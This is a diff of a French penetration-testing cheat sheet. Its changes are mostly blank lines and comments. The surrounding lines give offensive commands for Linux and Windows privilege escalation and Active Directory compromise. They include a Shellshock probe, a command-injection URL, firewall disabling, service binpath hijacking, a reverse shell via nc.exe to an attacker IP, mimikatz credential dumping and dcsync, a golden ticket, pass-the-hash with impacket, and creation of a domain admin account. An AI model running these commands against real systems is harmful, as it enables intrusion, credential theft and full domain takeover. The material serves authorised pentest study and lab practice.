@@ -20,6 +20,7 @@ Vérifier les ports et les services de la cible autorisée.
 
 ```bash
 nc -v [ip] [port]
+
 ```
 
 
@@ -27,6 +28,7 @@ nc -v [ip] [port]
 
 ```text
 telnet [ip] [port]
+
 ```
 
 
@@ -101,6 +103,7 @@ Interroger les enregistrements DNS et identifier les services associés.
 
 ```bash
 dig axfr
+
 ```
 
 
@@ -122,6 +125,7 @@ Examiner les objets, les droits et les services du domaine.
 
 ```text
 retr <number>
+
 ```
 
 
@@ -157,6 +161,7 @@ Examiner les objets, les droits et les services du domaine.
 
 ```bash
 pwd
+
 ```
 
 
@@ -203,6 +208,7 @@ Vérifier les ports et les services de la cible autorisée.
 
 ```bash
 curl -s http://[ip]/ | html2markdown
+
 ```
 
 
@@ -219,6 +225,7 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
 ```text
 pwd
+
 ```
 
 
@@ -240,6 +247,7 @@ Examiner les entrées et les réponses de l'application web.
 
 ```text
 $_SERVER[CONTEXT_DOCUMENT_ROOT]: [C:/xampp/htdocs]
+
 ```
 
 
@@ -270,6 +278,7 @@ Examiner les entrées et les réponses de l'application web.
 
 ```text
 /[boxName]
+
 ```
 
 
@@ -281,6 +290,7 @@ Examiner les entrées et les réponses de l'application web.
 
 ```bash
 nmap -sV -p [port] --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=echo\;/bin/ls [ip]
+
 ```
 
 
@@ -292,6 +302,7 @@ nmap -sV -p [port] --script http-shellshock --script-args uri=/cgi-bin/user.sh,c
 
 ```text
 GET /forgot_pass.php?email=%0aid
+
 ```
 
 
@@ -311,6 +322,7 @@ Examiner les connexions, la configuration et les requêtes de la base de donnée
 
 ```text
 pip3 install defaultcreds-cheat-sheet
+
 ```
 
 
@@ -331,6 +343,7 @@ Examiner les permissions et la configuration de Linux.
 
 ```bash
 sudo -l
+
 ```
 
 
@@ -338,6 +351,7 @@ sudo -l
 
 ```text
 cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash
+
 ```
 
 
@@ -348,6 +362,7 @@ cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash
 
 ```text
 ls -la
+
 ```
 
 
@@ -366,6 +381,7 @@ ls -la
 
 ```text
 find / -name "*.py"
+
 ```
 
 
@@ -381,6 +397,7 @@ find / -name "*.py"
 ```bash
 (env || set) 2>/dev/null
 echo $PATH
+
 ```
 
 
@@ -395,6 +412,7 @@ echo $PATH
 
 ```text
 mysql -uroot -pdasdasd
+
 ```
 
 
@@ -420,6 +438,7 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
 find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
 locate password | more
+
 ```
 
 
@@ -428,12 +447,14 @@ locate password | more
 ```powershell
 history
 cat ~/.bash_history
+
 ```
 
 
 ```bash
 history
 cat ~/.bash_history
+
 ```
 
 
@@ -441,6 +462,7 @@ cat ~/.bash_history
 
 ```bash
 strings /dev/mem -n10 | grep -i PASS
+
 ```
 
 
@@ -451,6 +473,7 @@ cat ~/.ssh/id_rsa
 ls ~/.ssh/*
 find / -name authorized_keys 2> /dev/null
 find / -name id_rsa 2> /dev/null
+
 ```
 
 
@@ -458,6 +481,7 @@ find / -name id_rsa 2> /dev/null
 
 ```bash
 find /etc \( -name rsyncd.conf -o -name rsyncd.secrets \)
+
 ```
 
 
@@ -479,6 +503,7 @@ Get-WmiObject -Class Win32_UserAccount
 Get-LocalUser | ft Name,Enabled,LastLogon
 Get-ChildItem C:\Users -Force | select Name
 Get-LocalGroupMember Administrators | ft Name, PrincipalSource
+
 ```
 
 
@@ -487,6 +512,7 @@ Get-LocalGroupMember Administrators | ft Name, PrincipalSource
 ```powershell
 net localgroup
 net localgroup Administrators
+
 ```
 
 
@@ -497,6 +523,7 @@ net localgroup Administrators
 
 ```powershell
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+
 ```
 
 
@@ -504,23 +531,30 @@ systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
 
 ```powershell
 wmic qfe
+
 ```
 
 
 ```powershell
+# Interroger les paramètres système WMI
 wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%
+
 ```
 
 
 ```powershell
+# Interroger les paramètres système WMI
 wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%
+
 ```
 
 
 ```powershell
+# Interroger les paramètres système WMI
 wmic logicaldisk get caption || fsutil fsinfo drives
 wmic logicaldisk get caption,description,providername
 Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
+
 ```
 
 
@@ -530,6 +564,7 @@ Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| 
 # Liste des exploits du noyau https://github.com/SecWiki/windows-kernel-exploits
 # pour compiler un programme à partir de Kali
 $ i586-mingw32msvc-gcc -o adduser.exe useradd.c
+
 ```
 
 
@@ -542,6 +577,7 @@ $ i586-mingw32msvc-gcc -o adduser.exe useradd.c
 ipconfig /all
 Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
 Get-DnsClientServerAddress -AddressFamily IPv4 | ft
+
 ```
 
 
@@ -550,6 +586,7 @@ Get-DnsClientServerAddress -AddressFamily IPv4 | ft
 ```powershell
 route print
 Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
+
 ```
 
 
@@ -558,6 +595,7 @@ Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIn
 ```powershell
 arp -A
 Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
+
 ```
 
 
@@ -565,11 +603,13 @@ Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,Stat
 
 ```powershell
 netstat -ano
+
 ```
 
 
 ```powershell
 netstat -bona
+
 ```
 
 
@@ -579,6 +619,7 @@ netstat -bona
 netsh advfirewall firewall dump
 netsh firewall show state
 netsh firewall show config
+
 ```
 
 
@@ -586,14 +627,17 @@ netsh firewall show config
 
 ```powershell
 $f=New-object -comObject HNetCfg.FwPolicy2;$f.rules |  where {$_.action -eq "0"} | select name,applicationname,localports
+
 ```
 
 
 
 
 ```powershell
+# Examiner les paramètres réseau Windows
 netsh advfirewall set allprofiles state off
 netsh firewall set opmode disable
+
 ```
 
 
@@ -602,6 +646,7 @@ netsh firewall set opmode disable
 ```powershell
 net share
 powershell Find-DomainShare -ComputerDomain domain.local
+
 ```
 
 
@@ -610,6 +655,7 @@ powershell Find-DomainShare -ComputerDomain domain.local
 ```powershell
 reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
 Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
+
 ```
 
 
@@ -631,6 +677,7 @@ accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
 
 # utilisant msf
 exploit/windows/local/service_permissions
+
 ```
 
 
@@ -640,6 +687,7 @@ exploit/windows/local/service_permissions
 wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\" |findstr /i /v ""
 wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32\" |findstr /i /v "" #Not only auto services
 gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '*'} | select PathName,DisplayName,Name
+
 ```
 
 
@@ -663,6 +711,7 @@ sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
 # puis redémarrez le service
 wmic service NAMEOFSERVICE call startservice
 net stop [service name] && net start [service name]
+
 ```
 
 
@@ -676,6 +725,7 @@ for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>n
 sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
 FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
 FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
+
 ```
 
 
@@ -691,6 +741,7 @@ get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "
 # si les utilisateurs authentifiés ou NT AUTHORITY\INTERACTIVE ont FullControl
 # il peut être utilisé pour modifier le chemin binaire à l'intérieur du registre
 reg add HKLM\SYSTEM\CurrentControlSet\srevices\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
+
 ```
 
 
@@ -703,6 +754,7 @@ reg query HKEY_LOCAL_MACHINE\SOFTWARE
 
 Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
 Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
+
 ```
 
 
@@ -729,6 +781,7 @@ icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ eve
 Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}} 
 
 Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
+
 ```
 
 
@@ -738,6 +791,7 @@ Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Ac
 # PATH DLL Hijacking
 # having write permissions inside a folder present ON PATH could bring to DLL hijacking
 for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\ everyone authenticated users todos %username%" && echo. )
+
 ```
 
 
@@ -760,6 +814,7 @@ msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.ms
 
 # installer .msi
 msiexec /quiet /qn /i C:\Users\Homer.NUCLEAR\Downloads\donuts.msi
+
 ```
 
 
@@ -775,6 +830,7 @@ schtasks /query /fo LIST /v | findstr /v "\Microsoft"
 Get-ScheduledTask | ft TaskName,TaskPath,State
 # filtrage de la sortie
 Get-ScheduledTask | where {$_.TaskPath -nolike "\Microsoft*"} | ft TaskName,TaskPath,State
+
 ```
 
 
@@ -785,6 +841,7 @@ wsl whoami
 ./ubuntum2004.exe config --default-user root
 wsl whoami
 wsl python -c 'put here your command'
+
 ```
 
 
@@ -798,6 +855,7 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 ```powershell
 # Utilisation de la motorisation
 powershell.exe Start-Process cmd.exe -Verb runAs
+
 ```
 
 
@@ -806,6 +864,7 @@ powershell.exe Start-Process cmd.exe -Verb runAs
 ```powershell
 # Vérifiez également avec les runas
 C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
+
 ```
 
 
@@ -814,6 +873,7 @@ C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\us
 ```powershell
 dir /s /b /p *pass* == *cred* == *vnc* == *.config* == *conf* == *ini*
 findstr /si /m password *.xml *.ini *.txt
+
 ```
 
 
@@ -823,6 +883,7 @@ findstr /si /m password *.xml *.ini *.txt
 cmdkey /list
 # s'il est trouvé
 runas /savecred /user:WORKGROUP\Administrator "\\attacker-ip\SHARE\welcome.exe"
+
 ```
 
 
@@ -852,6 +913,7 @@ reg query "HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4" /v password
 
 ## Identifiants OpenSSH
 reg query HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys
+
 ```
 
 
@@ -862,6 +924,7 @@ c:\sysprep.inf
 c:\sysprep\sysprep.xml
 %WINDIR%\Panther\Unattend\Unattend*.xml
 %WINDIR%\Panther\Unattend*.xml
+
 ```
 
 
@@ -869,6 +932,7 @@ c:\sysprep\sysprep.xml
 
 ```powershell
 dir /s /b /p *access*.log* == *.log
+
 ```
 
 
@@ -880,6 +944,7 @@ Get-Childitem -Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction Si
 
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
 C:\inetpub\wwwroot\web.config
+
 ```
 
 
@@ -949,6 +1014,7 @@ Bookmarks #Chrome
 History #Chrome
 TypedURLsTime #IE
 TypedURLs #IE
+
 ```
 
 
@@ -962,6 +1028,7 @@ netsh wlan show profile <SSID> key=clear
 # OR
 # Go hard and grab 'em all
 cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on
+
 ```
 
 
@@ -969,6 +1036,7 @@ cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| fi
 
 ```powershell
 c:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
+
 ```
 
 
@@ -980,6 +1048,7 @@ c:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8b
 Import-Module path\to\SessionGopher.ps1;
 Invoke-SessionGopher -AllDomain -o
 Invoke-SessionGopher -AllDomain -u domain.com\adm\-arvanaghi -p s3cr3tP@ss
+
 ```
 
 
@@ -991,6 +1060,7 @@ type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\Co
 type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 cat (Get-PSReadlineOption).HistorySavePath
 cat (Get-PSReadlineOption).HistorySavePath | sls passw
+
 ```
 
 
@@ -999,6 +1069,7 @@ cat (Get-PSReadlineOption).HistorySavePath | sls passw
 ```powershell
 Get-Item -path <filename> -Stream *
 Get-Content -path <filename> -Stream <keyword>
+
 ```
 
 
@@ -1012,6 +1083,7 @@ Get-Content -path <filename> -Stream <keyword>
 %SYSTEMROOT%\repair\system
 %SYSTEMROOT%\System32\config\SYSTEM
 %SYSTEMROOT%\System32\config\RegBack\system
+
 ```
 
 
@@ -1025,6 +1097,7 @@ AppData\Roaming\gcloud\legacy_credentials
 AppData\Roaming\gcloud\access_tokens.db
 .azure\accessTokens.json
 .azure\azureProfile.json
+
 ```
 
 
@@ -1045,6 +1118,7 @@ Drives.xml
 
 # Décrypter les mots de passe avec
 gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
+
 ```
 
 
@@ -1053,6 +1127,7 @@ gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
 ```powershell
 HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\
 HKCU\Software\Microsoft\Terminal Server Client\Servers\
+
 ```
 
 
@@ -1060,6 +1135,7 @@ HKCU\Software\Microsoft\Terminal Server Client\Servers\
 
 ```text
 Remote desktop credential manager
+
 ```
 
 
@@ -1067,6 +1143,7 @@ Remote desktop credential manager
 
 ```powershell
  %localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
+
 ```
 
 
@@ -1076,6 +1153,7 @@ Remote desktop credential manager
 $result = Get-WmiObject -Namespace "root\\ccm\\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
 if ($result) { $result }
 else { Write "Not Installed." }
+
 ```
 
 
@@ -1092,6 +1170,7 @@ Examiner les objets, les droits et les services du domaine.
 ```powershell
 hostname
 ipconfig /all
+
 ```
 
 
@@ -1103,11 +1182,13 @@ ipconfig /all
 
 ```powershell
 net user
+
 ```
 
 
 ```powershell
 net view \\[external_machine_ip]
+
 ```
 
 
@@ -1118,6 +1199,7 @@ net view \\[external_machine_ip]
 
 ```powershell
 sc query state= all | findstr "SERVICE_NAME"
+
 ```
 
 
@@ -1127,6 +1209,7 @@ sc query state= all | findstr "SERVICE_NAME"
 # Rechercher dans C:\\ProgramData, C:\\Users\\All Users et les dossiers propres aux applications, par exemple C:\\Program Files.
 
 dir /s /b C:\\Users\\Public\\*.config
+
 ```
 
 
@@ -1143,6 +1226,7 @@ reg save HKLM\\SYSTEM system.save
 
 # À exécuter depuis Kali
 impacket-secretsdump -sam <sam_file> -system <system_file> LOCAL
+
 ```
 
 
@@ -1160,6 +1244,7 @@ impacket-psexec <username>@<target_ip> -hashes 00000000000000000000000000000000:
 
 # VMIExec
 impacket-wmiexec -hashes 00000000000000000000000000000000:<NTLM_hash> <username>@<target_ip>
+
 ```
 
 
@@ -1177,6 +1262,7 @@ impacket-psexec <username>:<password>@<target_ip>
 
 # VMIExec
 impacket-wmiexec <username>:<password>@<target_ip>
+
 ```
 
 
@@ -1195,6 +1281,7 @@ dir \\\\<domain>\\SYSVOL\\<domain>\\Policies\\ /s /b | findstr cpassword
 
 # Recherchez les fichiers Groups.xml qui peuvent contenir des mots de passe clairs.
 smbclient //dc-ip/SYSVOL -U "domain\username"
+
 ```
 
 
@@ -1206,13 +1293,16 @@ smbclient //dc-ip/SYSVOL -U "domain\username"
 
 ```text
 Shortest Path to Domain Admins
+
 ```
 
 
 
 
 ```powershell
+# Collecter les relations Active Directory
 .\\SharpHound.exe -c All -d <domain> -u <username> -p <password> -f AllData
+
 ```
 
 
@@ -1220,6 +1310,7 @@ Shortest Path to Domain Admins
 
 ```powershell
 schtasks /query /fo LIST /v
+
 ```
 
 
@@ -1239,6 +1330,7 @@ impacket-smbclient [user]:[password]@[ip]
 impacket-smbclient [user]@[ip] -hashes 00000000000000000000000000000000:[valid_ntlm_hash]
 
 # Tester tout autre service possible ou chose intéressante que vous avez trouvé à nouveau les sous-domaines
+
 ```
 
 
@@ -1258,6 +1350,7 @@ Examiner les objets, les droits et les services du domaine.
 
 ```powershell
 mimikatz # lsadump::dcsync /domain:<domain> /user:<target_user>
+
 ```
 
 
@@ -1276,6 +1369,7 @@ mimikatz # lsadump::dcsync /domain:<domain> /user:<target_user>
 
 ```bash
 impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
+
 ```
 
 
@@ -1286,6 +1380,7 @@ impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
 
 ```powershell
 kerberos::golden /domain:<domain> /sid:<domain_SID> /krbtgt:<NTLM_hash> /user:Administrator
+
 ```
 
 
@@ -1302,6 +1397,7 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
 ```powershell
 mimikatz # sekurlsa::logonPasswords
+
 ```
 
 
@@ -1316,6 +1412,7 @@ mimikatz # sekurlsa::logonPasswords
 
 ```powershell
 hostname && whoami && ipconfig /all && type [local/proof].txt
+
 ```
 
 
@@ -1324,6 +1421,7 @@ hostname && whoami && ipconfig /all && type [local/proof].txt
 ```powershell
 net user new_admin <password> /add /domain
 net group "Domain Admins" new_admin /add /domain
+
 ```
 
 
